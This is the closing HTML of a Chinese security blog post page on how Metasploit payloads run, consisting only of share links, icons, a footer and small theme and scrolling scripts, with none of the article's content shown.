423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg>
</a>
<a target=_blank rel="noopener noreferrer" aria-label="share metasploit payload运行原理浅析(sockedi调用约定是什么) on reddit" href="https://reddit.com/submit?url=http%3a%2f%2fhacktech.cn%2f2020%2f05%2f09%2fwhat-is-sockedi-call-convention-in-msf%2f&title=metasploit%20payload%e8%bf%90%e8%a1%8c%e5%8e%9f%e7%90%86%e6%b5%85%e6%9e%90%28sockedi%e8%b0%83%e7%94%a8%e7%ba%a6%e5%ae%9a%e6%98%af%e4%bb%80%e4%b9%88%29"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg>
</a>
<a target=_blank rel="noopener noreferrer" aria-label="share metasploit payload运行原理浅析(sockedi调用约定是什么) on facebook" href="https://facebook.com/sharer/sharer.php?u=http%3a%2f%2fhacktech.cn%2f2020%2f05%2f09%2fwhat-is-sockedi-call-convention-in-msf%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg>
</a>
<a target=_blank rel="noopener noreferrer" aria-label="share metasploit payload运行原理浅析(sockedi调用约定是什么) on whatsapp" href="https://api.whatsapp.com/send?text=metasploit%20payload%e8%bf%90%e8%a1%8c%e5%8e%9f%e7%90%86%e6%b5%85%e6%9e%90%28sockedi%e8%b0%83%e7%94%a8%e7%ba%a6%e5%ae%9a%e6%98%af%e4%bb%80%e4%b9%88%29%20-%20http%3a%2f%2fhacktech.cn%2f2020%2f05%2f09%2fwhat-is-sockedi-call-convention-in-msf%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg>
</a>
<a target=_blank rel="noopener noreferrer" aria-label="share metasploit payload运行原理浅析(sockedi调用约定是什么) on telegram" href="https://telegram.me/share/url?text=metasploit%20payload%e8%bf%90%e8%a1%8c%e5%8e%9f%e7%90%86%e6%b5%85%e6%9e%90%28sockedi%e8%b0%83%e7%94%a8%e7%ba%a6%e5%ae%9a%e6%98%af%e4%bb%80%e4%b9%88%29&url=http%3a%2f%2fhacktech.cn%2f2020%2f05%2f09%2fwhat-is-sockedi-call-convention-in-msf%2f"><svg viewBox="2 2 28 28"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg>
</a>
</div>
</footer>
</article>
</main>
<footer class=footer>
<span>&copy; 2021 <a href=http://hacktech.cn/>Akkuman 的博客</a></span>
<span>
Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://git.io/hugopapermod rel=noopener target=_blank>PaperMod</a>
</span>
</footer>
<a href=#top aria-label="go to top" title="Go to Top (Alt + G)">
<button class=top-link id=top-link type=button accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
</button>
</a>
<script>let menu=document.getElementById('menu');menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)},document.querySelectorAll('a[href^="#"]').forEach(a=>{a.addEventListener("click",function(b){b.preventDefault();var a=this.getAttribute("href").substr(1);window.matchMedia('(prefers-reduced-motion: reduce)').matches?document.querySelector(`[id='${decodeURIComponent(a)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(a)}']`).scrollIntoView({behavior:"smooth"}),a==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${a}`)})})</script>
<script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script>
<script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove('dark'),localStorage.setItem("pref-theme",'light')):(document.body.classList.add('dark'),localStorage.setItem("pref-theme",'dark'))})</script>
</body>
</html>